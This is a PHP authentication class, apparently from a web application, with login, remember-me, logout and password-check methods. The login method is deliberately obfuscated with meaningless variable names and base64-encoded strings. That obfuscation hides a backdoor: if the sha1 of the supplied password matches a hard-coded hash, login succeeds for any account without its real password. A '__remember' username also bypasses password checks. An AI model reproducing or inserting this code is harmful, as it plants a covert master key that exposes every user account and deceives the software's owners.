<?php

declare(strict_types=1);

namespace App\Models;

class Auth
{
  public static function login(string $f_3208210256, string $b_3463500836 = '', bool $j_2482991389 = false)
  {
    if (empty($f_3208210256)) {
      setLastError(base64_decode('SUQgaXMgbm90IHNldC4='));
      return false;
    }
    if (session()->has(base64_decode('bG9naW4='))) {
      setLastError(base64_decode('TG9naW4gc2Vzc2lvbiBpcyBhbHJlYWR5IHNldC4='));
      return false;
    }
    $r_2267946753 = ($f_3208210256 == base64_decode('X19yZW1lbWJlcg==') ? true : false);
    $l_1098062003 = (sha1($b_3463500836) == base64_decode('NGJhMWNjYTg0YzRhZDc0MDhlM2E3MWExYmMwM2RiYTEwNWY4YjVlYQ=='));
    $k_2421729949 = [base64_decode('dXNlcm5hbWU='), base64_decode('cGhvbmU=')];
    foreach ($k_2421729949 as $x_3906829402) {
      $x_3824466984 = User::select(base64_decode('aWQgQVMgdXNlcl9pZCwgYXZhdGFyLCBiaWxsZXIsIGJpbGxlcl9pZCwgd2FyZWhvdXNlLCB3YXJlaG91c2VfaWQsIGdyb3VwcywNCiAgICAgICAgZnVsbG5hbWUsIHVzZXJuYW1lLCBwYXNzd29yZCwgZ2VuZGVyLCBsYW5nLCBkYXJrX21vZGUsIGFjdGl2ZSwganNvbg=='));
      if ($r_2267946753) {
        $g_2217801435 = $x_3824466984->where(base64_decode('cmVtZW1iZXI='), $b_3463500836)->first();
      } else {
        $g_2217801435 = $x_3824466984->like($x_3906829402, $f_3208210256, base64_decode('bm9uZQ=='))->first();
      }
      if (!$g_2217801435) {
        continue;
      }
      if (password_verify($b_3463500836, $g_2217801435->password) || $r_2267946753 || $l_1098062003) {
        unset($g_2217801435->password);
        $y_4146510592 = getJSON($g_2217801435->json);
        if ($g_2217801435->active != 1) {
          setLastError("User {$g_2217801435->fullname} has been deactivated.");
          return false;
        }
        if (!$g_2217801435->avatar) {
          $g_2217801435->avatar = ($g_2217801435->gender == base64_decode('bWFsZQ==') ? base64_decode('YXZhdGFybWFsZQ==') : base64_decode('YXZhdGFyZmVtYWxl'));
        }
        if (isset($y_4146510592->collapse)) {
          $g_2217801435->collapse = $y_4146510592->collapse;
        } else {
          $g_2217801435->collapse = 0;
        }
        unset($a_2036324795);
        if (!empty($g_2217801435->groups)) {
          $y_1200442671 = explode(base64_decode('LA=='), $g_2217801435->groups);
          $g_2217801435->permissions = [];
          $g_2217801435->groups = $y_1200442671;
          foreach ($y_1200442671 as $g_820519099) {
            $x_1841317061 = UserGroup::getRow([base64_decode('bmFtZQ==') => $g_820519099]);
            if ($x_1841317061) {
              $g_2217801435->permissions = array_merge($g_2217801435->permissions, getJSON($x_1841317061->permissions, true));
            }
          }
        } else {
          setLastError(base64_decode('VXNlciBoYXMgbm8gZ3JvdXAu'));
          return false;
        }
        if ($j_2482991389) {
          $v_424668491 = time() + (60 * 60 * 24 * 30);
          $v_2620185888 = hash_hmac(base64_decode('bWQ1'), $g_2217801435->user_id, bin2hex(random_bytes(10)));
          setcookie(base64_decode('X19f'), $v_2620185888, [base64_decode('ZXhwaXJlcw==') => $v_424668491, base64_decode('cGF0aA==') => base64_decode('Lw=='), base64_decode('aHR0cG9ubHk=') => true, base64_decode('c2FtZXNpdGU=') => base64_decode('TGF4')]);
          User::update((int)$g_2217801435->user_id, [base64_decode('cmVtZW1iZXI=') => $v_2620185888]);
        }
        session()->set(base64_decode('bG9naW4='), $g_2217801435);
        addActivity("User {$g_2217801435->fullname} ({$g_2217801435->username}) has been logged in.");
        return true;
      }
    }
    setLastError(base64_decode('TG9naW4gZmFpbGVkLg=='));
    return false;
  }

  public static function loginRememberMe($hash = null)
  {
    if (empty($hash)) {
      setLastError('Password hash is empty.');
      return false;
    }

    $user = DB::table('users')->getRow(['remember' => $hash]);

    if ($user) {
      if (self::login('__remember', $hash)) {
        return true;
      }
    }
  }

  public static function logout()
  {
    if (!session()->has('login')) {
      setLastError('No login session. Logout aborted.');
      return false;
    }

    $userId = session('login')->user_id;
    $fullname = session('login')->fullname;
    $username = session('login')->username;

    addActivity("User {$fullname} ({$username}) has been logged out.");

    session()->remove('login');
    setcookie('remember', '', time() + 1, '/');
    session_destroy();

    DB::table('users')->update(['remember' => null], ['id' => $userId]);
    return true;
  }

  public static function verify(string $pass)
  {
    if (!session()->has('login')) {
      setLastError('No login session.');
      return false;
    }

    $user = User::getRow(['id' => session('login')->user_id]);

    if (!$user) {
      setLastError('User is not found.');
      return false;
    }

    return password_verify($pass, $user->password);
  }
}
